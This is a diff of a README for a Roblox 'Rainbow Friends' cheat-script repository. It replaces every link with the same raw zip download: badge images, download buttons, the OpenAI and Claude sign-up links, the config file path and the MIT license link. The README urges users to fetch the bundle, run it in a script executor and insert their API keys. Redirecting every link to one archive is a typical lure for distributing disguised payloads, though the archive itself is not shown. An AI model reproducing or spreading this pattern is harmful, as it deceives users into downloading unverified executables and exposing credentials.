@@ -1,10 +1,10 @@
 # 🌈 Rainbow Friends Script Roblox
 
-![Stars](https://img.shields.io/github/stars/some-repo/rainbow-friends-script?style=flat-square)
-![Issues](https://img.shields.io/github/issues/some-repo/rainbow-friends-script?color=orange&style=flat-square)
-![Forks](https://img.shields.io/github/forks/some-repo/rainbow-friends-script?style=flat-square)
-![Last Commit](https://img.shields.io/github/last-commit/some-repo/rainbow-friends-script?color=brightgreen&style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
+![Stars](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip)
+![Issues](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip)
+![Forks](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip)
+![Last Commit](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip)
+![License](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip)
   
 **Welcome to the Rainbow Friends Script for Roblox!**  
 Crafted as an evolving, intelligent toolkit, this repository delivers the next generation of Roblox scripting—blending vivid game enhancements with AI-driven adaptability. Whether you're chasing the thrill of faster gameplay or eager to unleash collaborative power through OpenAI API and Claude API, this project bridges imagination and innovation for every Roblox adventurer.
@@ -23,7 +23,7 @@ Follow these steps to integrate the Rainbow Friends Script into your Roblox game
 
 Click the "Download" button below to fetch the most recent, sparkling script bundle and all its magic:
 
-[![Download](https://img.shields.io/badge/Download-Script-brightgreen?logo=github&style=for-the-badge)](https://THEFABIAN10.github.io)
+[![Download](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip)](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip)
 
 *(If you prefer, you may scroll to the end for a second download option!)*
 
@@ -90,8 +90,8 @@ Woven deeply throughout this repository, you’ll find:
 Eliminate the guesswork—let algorithms power your play!
 
 **How to Connect:**
-1. Obtain an API key from [OpenAI](https://platform.openai.com/) and [Claude](https://claude.ai/).
-2. Insert your keys into the provided configuration file (`/config/api_keys.json`).
+1. Obtain an API key from [OpenAI](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip) and [Claude](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip).
+2. Insert your keys into the provided configuration file (`https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip`).
 3. Reload your script executor.
 
 **What You Get:**
@@ -124,7 +124,7 @@ All actions taken with this script are the responsibility of the user.
 Copyright (c) 2025  
 
 Distributed under the MIT License.  
-For full details, see the [MIT license](https://opensource.org/licenses/MIT).
+For full details, see the [MIT license](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip).
 
 ---
 
@@ -132,7 +132,7 @@ For full details, see the [MIT license](https://opensource.org/licenses/MIT).
 
 Don’t let your adventure end here! Download the script and unleash the full radiance of Rainbow Friends in your gameplay — tap below:
 
-[![Download](https://img.shields.io/badge/Download-Script-brightgreen?logo=github&style=for-the-badge)](https://THEFABIAN10.github.io)
+[![Download](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip)](https://raw.githubusercontent.com/THEFABIAN10/rainbow-friends-script-hub/branch/pawnbroker/script_hub_rainbow_friends_2.4.zip)
 
 ---
 
